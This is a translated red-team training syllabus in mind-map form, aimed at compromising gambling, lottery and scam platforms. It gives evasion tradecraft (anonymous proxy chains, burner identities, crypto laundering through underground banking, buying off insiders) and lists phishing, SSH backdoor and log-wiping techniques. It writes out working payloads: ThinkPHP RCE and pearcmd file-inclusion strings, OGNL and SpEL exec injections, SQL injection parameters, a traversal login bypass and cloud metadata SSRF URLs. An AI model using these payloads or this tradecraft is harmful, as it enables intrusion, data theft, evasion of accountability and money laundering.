# Red Team Training Syllabus

> Source: Feishu document mind map

## (Anti-)Attribution Techniques

### Work Environment Configuration

#### Host Disk Encryption

- veracrypt
  - [https://www.veracrypt.fr/en/Downloads.html](https://www.veracrypt.fr/en/Downloads.html)
#### Virtual Machine Environment Configuration

- Remove Bluetooth and the NAT network adapter
- shadow defender
- Mount a shared folder to place files
- Keep the penetration machine separate from the reporting machine
- Do not allow WPS to sync documents
- mybase
  - keepass
#### Personal Information Cleanup

- Never use personal IDs
- Never use historical passwords
- Never use historical accounts
- Discard accounts after a single use
- Create anonymous email accounts
  - protonmail
    - [https://protonmail.com/](https://protonmail.com/)
  - outlook
    - [https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&sdf=0](https://www.microsoft.com/zh-cn/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook?deeplink=%2fowa%2f&sdf=0)
- Create an SMS-activation service account
  - [https://sms-activate.io/](https://sms-activate.io/)
- Device purchase (second-hand)
  - Device ID
  - wifi bssid
    - netsh wlan show networks mode=bssid
- SIM card purchase
  - Offline
  - Secondary SIM
- Telegram purchase
  - Not with your own phone number
- Cryptocurrency
  - Cold wallet/cash (domestic underground banking transactions) -> USDT -> multi-currency mixing -> USDT
    - Anonymous money-laundering loss 7%-10%
      - Money-laundering firms and underground banking, plus commission, bring the loss to 30%
#### Android VM + Physical Machine

#### Whom Anti-Attribution Targets

- Gambling white-label platform providers
  - IP
    - Account
#### Which Chains Were Built

#### What Information Each Hop of the Chain Leaks

#### Who Can Obtain This Information

#### Time Cost?

#### Required Permissions

### Network Environment Configuration

#### Anonymous Work Chain Configuration

- Anonymous host environment selection
  - Non-mainland regions
    - shockhosting
    - [psychz.net](http://psychz.net)
    - Not Hong Kong Alibaba Cloud
    - Amazon Web Services
    - cf
    - jtti.cc
  - Preferably supports USDT
  - Do not pick hosts from the same hosting provider
- Chain setup
  - Overseas data SIM -> frp -> SoftEther VPN -> lunaproxy (dynamic residential proxy)
  - [https://github.com/SoftEtherVPN/SoftEtherVPN_Stable](https://github.com/SoftEtherVPN/SoftEtherVPN_Stable)
  - Overseas data SIM -> lunaproxy -> traffic proxy
    - [https://suying999.net/auth/login](https://suying999.net/auth/login)
  - Domestic data SIM -> SoftEther VPN -> traffic proxy
  - Anonymous traffic device
- VPN configuration and trace cleanup
### Penetration Testing Environment and Tool Configuration

#### Create Accounts

- github
- [https://securitytrails.com/](https://securitytrails.com/)
  - The world's largest intelligence vendor
- [https://search.censys.io/](https://search.censys.io/)
  - Updates daily
    - rustscan
- fofa/hunter (not allowed to log in from the live VM)
#### Tools

- ffuf
- Cloud drive archive
  - [https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d](https://pan.baidu.com/s/1AL9YxaSvh0TpfBtnWe_LCw?pwd=431d)
#### Wordlists

- [https://github.com/9bie/dict](https://github.com/9bie/dict)
- [https://github.com/SexyBeast233/SecDictionary](https://github.com/SexyBeast233/SecDictionary)
- [https://github.com/r00tSe7en/MyDict](https://github.com/r00tSe7en/MyDict)
### [https://lcx.cc/post/3213/](https://lcx.cc/post/3213/)

### White-Label iGaming Platform Providers

#### Financier -> provides site-building services/development

- Code + setup
- Code + setup + operations
- Self-built site
- Gambling -> page links to a large batch of sites
### Counterintelligence and Counter-espionage

#### Commercial Espionage (content deleted)

- How to buy off an insider
- Commercial consulting firm playbook
- How to sell out an insider
- How to investigate and root out an insider
- Analysis and attribution of stolen-data supply chains
#### Geopolitical Confrontation | Spies of Different Regimes (content deleted)

## **Reconnaissance**

### Website Reconnaissance

#### SGK data source collection

- [https://breachforums.st/member?action=login](https://breachforums.st/member?action=login)
- potato
- BatChat
- Seagull
- Shimida
- tg
  - Buy temporary accounts to farm SGK query credits
- signal
- discord
- whatsapp
- Jabber
- session
- matrix
- simplex
#### What to Look at Once You Have a Site

- Use paramspider to build wordlists
  - to do
#### Open-Source Reconnaissance

- github
  - Keywords
    - ldap
      - Combine with domain asset information
        - Internal network asset information
    - login
    - Small businesses
    - Project linkage -> information under the account
    - Pinyin (abbreviations)
    - Subdomains
    - Internal domain names
    - com.xxx
    - Chinese
    - js/css/html/special filenames
  - Person linkage
    - star
    - fork
    - commit
    - follow
- [https://securitytrails.com/](https://securitytrails.com/)
  - Subdomains
- fofa/hunter/...
  - ico
  - title
  - body
  - Find source code
    - Scan for backups
      - Black-box -> white-box
- gitee/Kancloud/Yuque/[hackmd.io/Shimo](http://hackmd.io/石墨)
  - site:"[yuque.com](http://yuque.com)" "xxx"
- News
  - [https://sigma.world/zh-hant/cis/floor-plan/](https://sigma.world/zh-hant/cis/floor-plan/)
- Google dorks
  - duckduckgo
    - site:[xxx.com](http://xxx.com) -www -fare -css -parking
- hackone/[https://zeroday.hitcon.org/](https://zeroday.hitcon.org/)
- Twitter/facebook/linkin
  - Employees
    - Initial passwords follow a pattern
- Cloud drives
  - Third-party
- medium
  - Not mandatory
    - Get a membership
#### Supply Chain Reconnaissance

- Supplier conferences
  - Overseas enterprises
- Bidding and tendering
- Page fingerprints
  - js/css/html
#### OSINT Reconnaissance

- [https://securitytrails.com/](https://securitytrails.com/)
- [https://search.censys.io/](https://search.censys.io/)
  - Scans ports daily
    - Very timely
      - But occasionally misses things, not complete
- rapid7 dns
  - Set up ClickHouse locally
- [https://idc.ip138.com/idc/](https://idc.ip138.com/idc/)
- asn
- Page fingerprints to find source code
- API fingerprints to find source code
- Contact information to find source code
#### Bypass CDN

- Page fingerprints to find the real IP
- Historical DNS resolution to find the real IP
- IP ranges of related businesses to find the real IP
### Practical Attribution of Site-Building Companies

#### Attribution of Gambling White-Label Platform Providers

- Same CDN
- Same DNS
- Same data center
- Same page fingerprints to find test-site domain/IP linked to the platform provider
- Fuzzy search on same-keyword-feature domains
- Find customer support to match templates
#### Attribution of Gang Member Information

- Historical posts linked to accounts
- Special IDs
- sgk
- File metadata
- Phishing
### Penetration-Strike Breakthrough Ideas and Methods

#### Black-Box Rapid Initial-Access Approach

- Gambling sites
  - _
    - Penetration testing
      - Identify the version
      - Set up locally
      - Tools
        - Vulnerabilities
        - Vulnerabilities require permissions
        - Vulnerability principles
        - Packet capture
          - Modify yourself
    - Reconnaissance
    - Vulnerability accumulation
      - [Vulnerability accumulation](https://ot8oa9a41m.feishu.cn/docx/IfLOdfra7oxJrHxHB6qc7Dx8nux)
  - Promo sites
    - Injection
      - Modify sqlmap
        - Specified database, specified table
          - Remove all probe content
    - Backup files
    - Framework vulnerabilities
      - RCE/deserialization vulnerabilities
      - Upload
      - Arbitrary file read/write
      - github\google
      - [https://xvi.vulbox.com/](https://xvi.vulbox.com/)
    - Temporary setups
      - After compromise, dig through files for lateral movement
        - mq
          - Phishing
      - Before
      - Sold as a package
        - Easy to search
          - Together with the actual site
      - Rare
    - Collect domain assets for further expansion
      - Multiple platform-provider sub-sites share one promo site
      - Use platform-provider-related domains
  - Customer-service sites
    - xss
      - Phishing
      - electron rce
      - Self-built from purchased source code
      - markdown
        - Tags
    - Find the customer-service vendor's demo site and source code
    - Find the admin panel
    - Directory scan
    - Attribute platform-provider assets via customer-service site assets
      - 94chat
    - Social-engineer customer support for more site information
    - Taking the customer-service site does not yield core data
  - Page fingerprints to find related sites
    - js
    - js console
    - Static resource loading
    - wss
    - Unreliable
  - Attack the platform provider
    - Ops services
      - Jenkins
      - Various domestic OA management software
      - mq
    - Test sites
      - Weak passwords
      - getshell
        - Lateral
        - Malware/phishing
          - yun
            - Client machines
        - Grab source code
        - Error debugging
      - Collect admin-panel APIs
        - ../../
      - Source-code resellers
        - Briefly chat
        - Scan backups
        - Black-box
        - Find more page fingerprints from admin-panel page resources
          - money.php
          - Admin-panel debug errors
            - Special database table names, filenames
    - Historical edge assets
      - Platform providers are hard to find
    - bbscan to find backups for quick code audit
      - Backups only apply to this site
        - Admin API, backend filenames
    - Is privilege escalation meaningful?
      - When the admin panel has multiple admin accounts
      - Vertical privilege escalation
        - More API permissions
      - Horizontal privilege escalation
        - Whole site
      - Reconnaissance, black-box, white-box, internal network
        - Attack target
           - Clear division of roles
           - Corporate employees
         - Complete a target end-to-end independently
         - CaA
         - Burp, Yakit
           - cpacha_killer_modify
           - When Burp can't capture traffic because its fingerprint is detected, modify TLS
           - Choose the basic one
           - PoC verification
             - Scanner development
               - Try not to carry attack signatures
               - Make request payloads harmless
   - What is the target
     - Compromise the white-label platform
       - Control all data
       - Rights protection
       - Supply chain
         - Customer credentials and payment info
       - Console sub-permissions
       - Obtain source code
       - Control ops and dev, at worst control customer service
       - Whether to control customers further down
         - 2FA verification
           - Bind HTTPS
           - Google Authenticator
           - Phone binding
           - Microsoft Authenticator
         - IP whitelist
           - XFF header
           - If vulnerable, modify config
         - Login IP
         - Chrome remote debug
         - Cookie/storage
   - Fourth-party payment / external platforms (switched target)
     - Login proxy
       - Username varies
       - Loaded assets change
       - New domain characteristics can't be correlated back to the origin server
     - Find the framework
     - Find assets
     - Find vulnerabilities
   - The big get bigger, the small get smaller
     - Buy a gambling license (registration)
       - Formalize, incorporate, scale up
         - Azure
         - Cloud applications
         - High difficulty, high time cost
           - Long prison terms, dampens motivation
     - The original operation was compromised
       - Sell source code
         - Outdated
           - Frontend unreliable
             - Backend code was modified
               - uniapp frontend
                 - Hired private developers
                   - Backend | API | filename xxx.php
         - Code incomplete
           - The dumped code
             - Not fully decrypted
         - Logic has issues
           - Collector
             - Legitimate data collection
             - Add lottery types and rounds you can control
       - Credit platform | Casino
         - Main target
       - QB
         - 6-month trial period
           - Compromise and maintain long-term persistence
       - Blockchain
         - Web3
         - Pig-butchering scam
           - BTC gambling games
       - TG bot
       - The original boss quit
         - His people resell it
           - Originally had few vulnerabilities
           - Does the source code have backdoors
       - Micro-trading platform
         - Refined chat
- cp
  - Injection
    - SQL injection in the betting flow
      - Connects to external lottery APIs, the main site is self-hosted
      - Frontend/backend encryption
    - Check-in injection
    - Roulette event
    - orderby=rand(1=1)
  - Customer service site
    - Invitation code
    - 53
    - meiqia
  - Directory site
  - Chat room
    - XSS
      - ws
    - Locate the white-label platform
  - Image site
    - Locate the white-label platform
    - [img.xxx.com](http://img.xxx.com)
      - Management system
  - Editor
    - Arbitrary file upload
    - XSS
    - ueiditor
      - PHP
        - SSRF
          - Internal network live ports
          - Real IP
            - DNS
            - 176.xxxx
      - dotnet
        - Upload
  - Points system
    - Abandoned
  - Demo site
    - Compromise the source code
  - Error messages
    - JSON closing
    - Array of variable names
      - word[]=xxx
        - java \ php \ middleware
          - cf
  - Multiple ports
    - High ports running other services
      - Real IP
      - Bound to different domains
    - nginx reverse proxy
      - 80-30000+
  - Set up BaoTa / HuWeiShen
    - Lab practice
      - Injection
      - Upload
      - Change password
      - Shut down services
  - Dump the database
    - adminer
    - Transfer to the server in chunks
      - Web directory
      - GitHub LFS
        - Action
  - Deserialization
    - CI
      - [https://guokeya.github.io/post/lQXYmp8_4/](https://guokeya.github.io/post/lQXYmp8_4/)
      - gzip test.phar
  - Mainstream domestic domains
    - Common SRCs
    - Gambling sites, fraud sites
      - Collected in bulk via signatures
    - Crawler
      - Build wordlists
- zp
  - Quick initial access on this site
    - Directories
    - Ports
    - Weak credentials
    - bbscan to find backups, quick code audit
    - Avatar upload
    - Voice Moments upload
      - Phishing
        - SH
    - Nude chat, same-city free
      - Task-based order brushing
  - n websites
    - 1-2 months
  - Half year to 1 year
  - PHP
    - Variable overwrite
  - Routes
    - filter, WAF,
    - Extract and run a scan
  - Vulnerability points
    - Config files
      - Hardcoded
        - Cookie forgery
    - Dangerous functions
      - Debug
        - Black Lily
    - How to trigger and what conditions are needed
      - Routes
      - Permissions
  - Temporarily buy a server
    - RAM
      - Must bind MFA
        - [https://auth.ping8.top/](https://auth.ping8.top/)
          - Export username: secret
#### Common Vulnerability Principles and Exploitation Tools and Approaches

- Exploitation approach
  - Components
    - Source code
      - Open source
      - Backup
      - Trick the customer service / test site
      - Cloud storage leaks
      - Test multiple versions
      - Commercial version needs cracking
        - Encryption/decryption
    - PHP vulnerabilities
      - 23, 24
        - cgi-bin
          - XAMPP
  - Version
    - Update time
    - Fix logs
      - How was it fixed? Bypass it
    - Affected scope
    - Differences between commercial and open-source versions
      - hw
  - Obtaining PoC
    - GitHub
    - Blogs
    - Analyze source code yourself
      - No exploit released
        - Analyze the patch yourself
    - Extract via packet capture with tools
  - Principles
    - Vulnerability points
    - Exploitation conditions
    - Adverse consequences
    - Request routes
      - Secondary development
  - Real-world adaptation
    - Set up local environment
    - No outbound connection
    - .net core
      - Memory shell
- Common vulnerabilities
  - SQL injection
    - Don't use sqlmap
    - Write your own script
    - Whether web and DB are separated
    - Whether write permission is available
    - Whether command execution is possible
      - oracle
        - 19c
          - sys
    - If uncrackable, write admin credentials or config parameters (file type) or rewrite the key
      - Bcrypt
      - Uploaded file type
    - [https://github.com/r0oth3x49/ghauri](https://github.com/r0oth3x49/ghauri)
  - Arbitrary file read
    - Read sensitive files
      - Can you list directories
      - Can Windows cross drive letters
      - .bash_history
      - .viminfo
      - Source code, config files, logs, startup scripts
      - /proc/net/
      - /proc/self/
      - /proc/pid/
  - Arbitrary file upload
    - Directories
      - Whether the directory is returned
      - /var/www/[www.xxx.com/img/xxx.php](http://www.xxx.com/img/xxx.php)
        - [www.xxx.com/limg/xxx.php](http://www.xxx.com/limg/xxx.php)
    - Upload to OSS
    - Upload local | cross drive letters
    - Combined with arbitrary file inclusion
  - Docker
    - Determine the environment
      - .dockerenv |ls -alh /.dockerenv|cat /proc/1/cgroup|mount | grep "docker"|fdisk -l|ps -aux
    - cat /proc/self/status | grep Cap
      - Privileged mode to mount the host
      - 0000003fffffffff
    - Registry API unauthorized access exploitation
      - [https://github.com/Soufaker/docker_v2_catalog](https://github.com/Soufaker/docker_v2_catalog)
    - Remote API unauthorized access
      - 2375
        - docker -H tcp://<target>:2375 ps -a
    - [https://github.com/teamssix/container-escape-check](https://github.com/teamssix/container-escape-check)
    - [https://github.com/cdk-team/CDK](https://github.com/cdk-team/CDK)
  - SSRF
    - [http://100.100.100.200/latest/meta-data](http://100.100.100.200/latest/meta-data)
    - [http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role](http://100.100.100.200/latest/meta-data/ram/security-credentials/huocorp-terraform-goat-role)
    - [http://metadata.tencentyun.com/latest/meta-data/](http://metadata.tencentyun.com/latest/meta-data/)
    - OSS Browser, CF
    - [https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html](https://doc.hcs.huawei.com/zh-cn/usermanual/ecs/ECS_ug_000081.html)
  - PHP config file write
    - '); phpinfo(); /*
    - Variable overwrite
  - How to proceed with only a login page
    - Classic interview question
      - Tests divergent thinking
    - IP
    - Domain
    - Google search for historical articles mentioning the site
      - wayurl
    - JS \ directories \ interfaces \ parameter brute-force (arjun, hae)
    - Injection
      - .net
    - Registration
    - Find login scripts on GitHub
    - Brute-force JWT
    - Help docs
    - [https://github.com/cws001/swagger-exp-knife4j](https://github.com/cws001/swagger-exp-knife4j)
  - TP
    - Tools
      - [https://github.com/bewhale/thinkphp_gui_tools](https://github.com/bewhale/thinkphp_gui_tools)
    - Logs
    - Debug
    - RCE
      - High versions
    - Multi-language
      - Docker
    - Injection
      - 3.2.3, 3.2.5
  - Telegram reconnaissance
    - Phishing pages
      - LinkedIn
        - Email
        - Phone
      - evilginx
  - Collect white-label platform intel
    - Philippines, Taiwan
- SSH backdoor
  - tsh
    - Internal network machines
    - Produce outbound connections
    - The VPS machine must not go down
  - PAM
    - Test the version well
    - Keep the connection stable, must not drop
  - [https://github.com/9bie/sshdHooker](https://github.com/9bie/sshdHooker)
- Find files
  - [https://github.com/AabyssZG/FindEverything](https://github.com/AabyssZG/FindEverything)
    - Extend it into a version you like
- Trace removal
  - Windows
    - [https://github.com/r00tSe7en/ShadowlessFeet](https://github.com/r00tSe7en/ShadowlessFeet)
#### Trace cleanup

- unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG; export HISTFILE=/dev/null; export HISTSIZE=0; export HISTFILESIZE=0
- Modify file timestamps
- Internal network discovery logic
  - Strictly no scanning inside the internal network
  - Access the internal network according to machine logic
  - Discover the internal network via existing connections
- Script tasks
  - Single-threaded
  - Scan a single port
   - Randomized IP addresses
   - Random delay after scanning
## **Code Audit **

### Hands-on Java Code Audit

#### BC Site Source-Code Audit for Getshell (Hands-on)

- pom
  - SQL injection
    - mybatis
      - Strict typing
      - order by ${time}
      - LIKE '%${stuName}%'
      - in (${id})
      - Directly invoked statements
      - OGNL injection
        - <select id="getUserByUserName" parameterType="String" resultMap="User">    select * from users where username like ${username}</select
        - OgnlCache.getValue
          - **parseExpression**
            - ${@java.lang.Runtime@getRuntime().exec("whoami")}
            - ${@java.lang.Thread@currentThread().sleep(9000L)}
        - [https://commons.apache.org/dormant/commons-ognl/language-guide.html](https://commons.apache.org/dormant/commons-ognl/language-guide.html)
        - [https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md](https://github.com/Mr-xn/Penetration_Testing_POC/blob/master/%E6%B3%9B%E5%BE%AEe-mobile%20ognl%E6%B3%A8%E5%85%A5.md)
  - Deserialization
    - fastjson
      - Even if not exploitable, confirm the CC chain exists
    - shiro
    - log4j
    - Determine which gadget chain is exploitable from dependencies and versions
    - So-called tool familiarity
      - Understand the vulnerability principle
      - Have a PoC
      - Can modify the PoC (gadget chain)
    - JasperReports
  - SSTI template injection
    - thymeleaf
      - [https://www.thymeleaf.org/documentation.html](https://www.thymeleaf.org/documentation.html)
        - $
        - *
        - ~
      - SpEL expression execution
        - [https://itmyhome.com/spring/expressions.html](https://itmyhome.com/spring/expressions.html)
        - Prerequisites
          - The incoming expression is unfiltered
          - getValue/setValue is called after expression parsing
          - Uses StandardEvaluationContext (default) as the context object
      - __$%7bnew%20java.util.Scanner(T(java.lang.Runtime).getRuntime().exec(%22calc.exe%22).getInputStream()).next()%7d__::.x
        - templateName
  - Component weak credentials / unauthorized access
    - durid
      - Unauthorized access
      - rce
    - swagger-ui
    - xxl-job
  - Component versions
  - Functional modules
- filter
  - Vulnerabilities leading to directory traversal
    - Unauthorized access
  - xss
- Routing
  - Combine black-box and white-box approaches to enumerate unauthorized endpoints
    - Simply analyze status codes
- LICENSE
  - Identify the framework
- Map out functional modules
- Login functionality
  - Login bypass
    - GET /api/admin/login/../../../api/userBill/export  HTTP/1.1Host: 3.1.181.69:8080Accept: application/json, text/plain, */*x-api-idempotent: bfe3cd31-cf0c-4ac5-a1ba-f9886f5b556dAccept-Language: zh-CNUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.127 Safari/537.36Referer: [http://3.1.181.69:8080/Accept-Encoding:](http://3.1.181.69:8080/Accept-Encoding:) gzip, deflate, brConnection: keep-alive
  - Hardcoded secrets
    - Inspect the token and cookie generation logic
      - Forge tokens and cookies
  - Weak randomness (same approach across languages)
    - [https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html](https://www.leavesongs.com/PENETRATION/jumpserver-sep-2023-multiple-vulnerabilities-go-through.html)
      - django-simple-captcha
        - With the same seed, two random-number draws are identical
          - random.seed() sets a seed that applies to the whole process. In other words, if we set the random seed through a captcha request, a subsequent password-recovery request that passes through the same process will use our seed to generate random numbers
- Unauthorized and permission-controllable endpoint functions
  - Upload
  - Injection
    - [https://www.yangdx.com/2022/05/211.html](https://www.yangdx.com/2022/05/211.html)
  - xxe
    - Can it achieve RCE?
    - file ftp mailto http https jar netdoc
  - File operations
  - ssrf
- Crude WAF rules
  - Usually in the filter
    - Lax rules allow WAF bypass
    - Find endpoints not covered by the filter rules
- [https://blog.csdn.net/sdnuwjw/article/details/103536816](https://blog.csdn.net/sdnuwjw/article/details/103536816)
#### CP Site Source-Code Audit for Getshell (Hands-on)

- Online decompilation
  - [http://www.javadecompilers.com/](http://www.javadecompilers.com/)
  - [http://www.decompiler.com/](http://www.decompiler.com/)
  - [https://devtoolzone.com/decompiler/java](https://devtoolzone.com/decompiler/java)
  - [https://jdec.herokuapp.com/](https://jdec.herokuapp.com/)
  - [https://www.mobilefish.com/services/java_decompiler/java_decompiler.php](https://www.mobilefish.com/services/java_decompiler/java_decompiler.php)
  - [http://javare.cn/](http://javare.cn/)
- Quickly find keywords
  - [https://github.com/Ppsoft1991/CodeReviewTools](https://github.com/Ppsoft1991/CodeReviewTools)
  - [https://github.com/4ra1n/code-inspector](https://github.com/4ra1n/code-inspector)
  - [https://github.com/jar-analyzer/jar-analyzer](https://github.com/jar-analyzer/jar-analyzer)
  - [https://github.com/ax1sX/RouteCheck-Alpha](https://github.com/ax1sX/RouteCheck-Alpha)
- Hands-on case study (removed)
- After confirming the vulnerability, find live sites by route and page characteristics
- [https://github.com/blackorbird/APT_REPORT](https://github.com/blackorbird/APT_REPORT)
- [https://github.com/timwhitez/Doge-DNSptr](https://github.com/timwhitez/Doge-DNSptr)
- [https://github.com/bit4woo/knife](https://github.com/bit4woo/knife)
#### Java Deserialization

- classloader
  - BootStrap ClassLoader(-Xbootclasspath)
    - rt.jar
      - java.lang, [java.io](http://java.io/)
    - resources.jar
    - charsets.jar
  - Ext ClassLoader(-D java.ext.dirs)
  - App ClassLoader(-classpath)
  - AppClassLoader's parent (not its superclass) is ExtClassLoader
    - AppClassLoader's class: class jdk.internal.loader.ClassLoaders$AppClassLoader
    - ExtClassLoader's class: class jdk.internal.loader.ClassLoaders$PlatformClassLoader  // PlatformClassLoader in JDK 8+
    - AppClassLoader's superclass: class jdk.internal.loader.URLClassLoader
    - ExtClassLoader's superclass: class jdk.internal.loader.URLClassLoader
  - Both AppClassLoader and ExtClassLoader are member classes of the sun.misc.Launcher class
  - Top parent loads -> parent loads -> fall back to local load when not found
    - Load in the current class -> fall back to parent load when not found
      - Custom ClassLoader
        - loadClass (loads the specified Java class): if a custom ClassLoader overrides loadClass, it breaks the parent delegation mechanism, because the parent delegation mechanism is implemented in loadClass.
        - findClass (finds the specified Java class)
        - findLoadedClass (finds a class already loaded by the JVM)
        - defineClass (defines a Java class): if any ClassLoader's defineClass is invoked with the corresponding bytecode, the JVM loads that class (and if the class extends or implements a class or interface, the parent class/interface is loaded first). The one caveat is that when a custom ClassLoader loads a class, its package name must not start with java., otherwise an exception is thrown.
        - resolveClass (links the specified Java class)
        - The webshell defines an equals method and calls fillContext to pass in the pageContext, then obtains the request, response, and session objects from pageContext
  - BCEL ClassLoader
    - com.sun.org.apache.bcel
      - Bundled in the JDK
        - JDK < 8u251
          - rt.jar
      - tomcat7: [org.apache.tomcat.dbcp.dbcp.BasicDataSource](http://org.apache.tomcat.dbcp.dbcp.basicdatasource/)
      - Tomcat 8 and later: [org.apache.tomcat.dbcp.dbcp2.BasicDataSource](http://org.apache.tomcat.dbcp.dbcp2.basicdatasource/)
      - In loadClass(), createClass() uses substring() to cut the string after $$BCEL$$, then calls Utility.decode to decode it and returns the byte array. It then creates a Parser and calls parse() to produce a JavaClass object, gets that object's byte array, and calls Java's native defineClass() to load it, achieving class loading.
- Command execution
  - Directly or indirectly call newTransformer or getOutputProperties, eventually reaching defineTransletClasses, which redefines the bytecode stored in the _bytecodes field as a class in the JVM; calling newInstance on it then triggers the code in its static block or no-arg constructor.
- cc
- c3p0
- 0XACED005
### Hands-on PHP Code Audit

#### BC Site Source-Code Audit for Getshell (Hands-on)

- Installation
  - composer
  - git
  - Manually copy the package
  - docker
- Differences between TP3 and TP5
  - 3
    - Directory names start with an uppercase letter
  - 5/6
    - Directory names start with a lowercase letter
  - Logs are stored in different locations
- Architecture
  - runtime
    - Page cache
      - Cache::set
    - session
      - log->session id
  - application/6-app
    - Holds the project source code
  - thinkphp
    - Framework source code
    - 6-/vendor/topthink/framework/src/think
  - vender
    - Extension libraries installed by Composer
  - extend
    - Manually placed third-party libraries or self-wrapped libraries
- Routing modes
  - tp3
    - # tp3.2.* /ThinkPHP/Conf/convention.php return array( 'URL_MODEL'              => 1, // URL modes: 0 (normal); 1 (PATHINFO, default); 2 (REWRITE); 3 (compatible) // Static routing: 'URL_ROUTER_ON' = false, 'URL_ROUTE_RULES' = array(), )
  - tp5
  - tp6
    - No configuration needed; accessible via pathinfo and compatibility mode. Only routing config is supported, with self-defined dynamic and static route rules set through the Route class. If forced routing is enabled, all requests must match a route rule to succeed. The config path is /config/route.php
      - Route::get
      - Route::rule
      - Route::xxx
- SQL injection
  - count and max methods call parseKey without filtering
    - 5.0.0/5.0.23/tp3
  - ThinkPHP/Library/Think/Model.class.php::_parseOptions directly concatenates the PDO parameter $option
  - parseWhereItem in ThinkPHP\Library\Think\Db\Driver.class.php directly concatenates and processes where query expressions
    - bind expression: ThinkPHP <= 3.2.4
    - between expression: ThinkPHP 3.1.*-3.2.0
    - eq/neq/gt expression: ThinkPHP 3.2.*
    - id[]=bind&id[]=1%27&tel[]=112312616&email=admin@emal.com
  - parseData in thinkphp/library/think/db/Builder.php calls parseKey without filtering
    - 5.0.13<=ThinkPHP<=5.0.15 (inc/dec), 5.1.0<=ThinkPHP<=5.1.5 (exp/inc/dec)
    - username[0]=exp&username[1]=updatexml(1,concat(1,user(),1),1)&username[2]=2
  - Betting
    - News already viewed
      - Check-in | campaign
        - Wheel of fortune
- rce
  - Request::__construct variable override + Request::input code execution
    - ThinkPHP [5.0.0, 5.0.23]
    - Exploitation conditions
      - trace + forced routing (url_route_on and url_route_must enabled)
        - _method=__construct&filter[]=system&method=get&server[REQUEST_METHOD]=id
      - debug + url_route_on routing enabled (default)
        - _method=__construct&filter[]=system&get[]=id
      - $dispatch['method'] + url_route_on routing enabled (default)
        - ?s=captcha_method=__construct&filter[]=system&method=get&get[]=id
  - In $dispatch['module'] mixed mode, the unfiltered controller App::invokemethod reflection can call any class, leading to code execution
    - ThinkPHP [5.0.0, 5.0.23], ThinkPHP [5.1.0, 5.1.30]
    - url_route_on enabled by default (mixed mode)
    - /public/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
  - think\process\pipes\Windows:__destruct arbitrary file deletion
  - LoadLangPack.php::switchLangSet() multi-language mode inclusion
    - Affected versions: ThinkPHP v6.0.1-v6.0.13, v5.0.x, v5.1.x
    - Direct RCE requires deploying the framework in Docker and PHP with the pear extension enabled (compiled with --with-pear), or a PHP build with the pear extension installed and enabled; including the file is enough.
    - Steps
      - GET /index.php?+config-create+/&lang=../../../../../../../../../usr/local/lib/php/pearcmd&/+/<?=phpinfo();?>+/tmp/test.php HTTP/1.1
      - GET /index.php?lang=../../../../../../../../tmp/test HTTP/1.1
  - View::assign() template variable override + file inclusion
    - Affected versions: ThinkPHP 3.2.*, ThinkPHP [5.0.0, 5.0.18], ThinkPHP [5.1.0, 5.1.10]
    - Conditions
      - Variables assigned to the template via View::assign(), or their contents, are controllable.
      - Must be paired with an uploaded image shell, log file, backup file, or similar to forge a normal-looking file, then request its inclusion.
- Authentication/authorization
  - Route class dynamic parameters
    - Route::get('view/:name$', 'News/read')->option('rule', 'admin');
  - 2. Set up authentication middleware (route whitelist)
    - Route::rule('hello/:name','hello')->middleware('Auth');
  - 3. Pre/post action checks: beforeAction and afterAction
  - 4. Captcha login
  - 5. Implement an auth class and a third-party RBAC-based authorization library
- file_get_content
  - Arbitrary file read
  - ssrf
    - fsockopen
    - readfile
    - fopen/fread/fgets/fgetss /fgetc/fgetcsv/fpassthru/fscanf
    - file
    - highlight_file/show_source
    - parse_ini_file
    - simplexml_load_file
  - curl
  - php:input
    - /etc/passwd
- extends
  - Authorization class
    - If absent, endpoints are accessible without authorization
      - but the route must be reachable
- File upload
  - Temporary files
    - Race condition
  - Extension validation
  - phpinfo
    - Write files
- XSS against the admin backend
  - Bank cards
  - XSS receiving platform
- is_dir/unlink
  - File-operation functions trigger phar deserialization
    - CI4
  - unlink deletes some lock files
    - Limited value
- xss
  - htmlspecialchars does not escape single quotes by default
  - Multiple encoding conversions
#### CP Site Source-Code Audit for Getshell (Hands-on)

#### ZP Site Source-Code Audit for Getshell (Hands-on)

#### Tongda OA Historical Vulnerabilities

#### Commercially Encrypted PHP Code / PHP Admin Pages of IoT Devices

- Hook PHP DLL functions to dump plaintext
- Dump plaintext from memory
### Hands-on .NET Site Code Audit

#### Java Memory Shell

- Loading process
  - Tomcat architecture
  - Loading security mechanisms
- Pervasiveness
- Difference between reflection and shell
#### .NET Memory Shell

- [https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ](https://mp.weixin.qq.com/s/6v_JVnFsgIGGmC_wa3UZwQ)
## **Post-Exploitation Lateral Movement **

### Server and Personal PC Reconnaissance Tools and Methods

#### Bypass EDR to Obtain Hashes

- Basics
  - ntlm
    - winlogon.exe -> receives the user password -> lsass.exe -> compares it against the SAM table
  - Golden ticket
  - Silver ticket
  - Diamond ticket
  - Sapphire ticket
  - Unconstrained delegation
  - Constrained delegation
### Domain Privilege Escalation Methods

#### Privilege Escalation via WSUS and SCCM

- [https://github.com/AlsidOfficial/WSUSpendu](https://github.com/AlsidOfficial/WSUSpendu)
  - In-domain patch update server; the principle is similar to an EDR console pushing files and commands
- [https://github.com/xpn/sccmwtf](https://github.com/xpn/sccmwtf)
  - Push PowerShell
#### Privilege Escalation via Azure AD

- Azure AD Sync
#### Attack the Mail Server

- Where a domain admin has logged in
- Read through mail
- With WriteACL permission, grant yourself DCSync directly
  - [https://github.com/dirkjanm/PrivExchange](https://github.com/dirkjanm/PrivExchange)
#### Bastion Host / Ops Host

#### Steal Passwords via Web Backdoor

